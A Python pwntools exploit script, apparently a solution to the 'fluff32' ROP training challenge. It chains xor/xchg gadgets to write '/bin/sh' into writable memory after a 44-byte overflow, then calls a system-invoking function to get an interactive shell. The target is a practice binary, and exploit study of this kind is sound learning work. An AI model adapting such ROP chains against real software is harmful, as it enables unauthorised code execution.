#!/usr/bin/env python2
from pwn import *

# Plan
# 
# Move String to Memory
# Pass as argument to usefulFunction
# 

# Rops & Addresses
usefulFunction  = 0x0804865a # - 14 for start
data_write      = 0x0804a028 + 0x10

# pop edi;
# xor edx, edx;
# pop esi;
# mov ebp, 0xcafebabe; 
# ret;
reset_edx                   = 0x08048670 

# pop esi;
# xor edx, ebx;
# pop ebp;
# mov edi, 0xdeadbabe;
# ret;
xor_edx_ebx                 = 0x0804867a

# mov edi, 0xdeadbeef;
# xchg edx, ecx;
# pop ebp;
# mov edx, 0xdefaced0;
# ret;
xchg_edx_ecx                = 0x08048689

# pop edi;
# mov dword [ecx], edx;
# pop ebp;
# pop ebx;
# xor byte [ecx], bl;
# ret;
mov_edx_ecx_xor_ecx_bl      = 0x08048692

# pop ebx; ret;
pop_ebx                     = 0x080483e1

rubbish = 0x69696969 
bin_sh  = "/bin/sh".ljust(8, '\x00')


# Functions

def load_string(string, base_addr):
    payload = ""
    for i in range(0, len(string), 4):
        
        # Set ecx to base_addr + i

        payload += p32(reset_edx)       # edx = 0
        payload += p32(rubbish)
        payload += p32(rubbish)
        
        payload += p32(pop_ebx)         # ebx = base_addr + i
        payload += p32(base_addr + i)

        payload += p32(xor_edx_ebx)     # edx = base_addr + i
        payload += p32(rubbish)
        payload += p32(rubbish)

        payload += p32(xchg_edx_ecx)    # ecx = base_addr + i
        payload += p32(rubbish)

        # set dword [ecx] to /bin/sh
        
        payload += p32(reset_edx)       # edx = 0
        payload += p32(rubbish)
        payload += p32(rubbish)

        payload += p32(pop_ebx)         # ebx = string[i:i+4]
        payload += string[i:i+4]
        
        payload += p32(xor_edx_ebx)     # edx = 0 ^ string[i:i+4] 
        payload += p32(rubbish)         # edx = string[i:i+4]
        payload += p32(rubbish)

        # write string
        
        payload += p32(mov_edx_ecx_xor_ecx_bl)
        payload += p32(rubbish)
        payload += p32(rubbish)
        payload += p32(0x00)

    return payload

# Payload
payload  = ""
payload += "A"*44
payload += load_string(bin_sh, data_write)
payload += p32(usefulFunction)
payload += p32(data_write)

log.info("Payload:\n" + payload.encode('hex'))
with open('payload', 'wb') as f:
    f.write(payload)

exe  = "./fluff32"
proc = process(exe) 
proc.recv()
proc.sendline(payload)
proc.interactive()
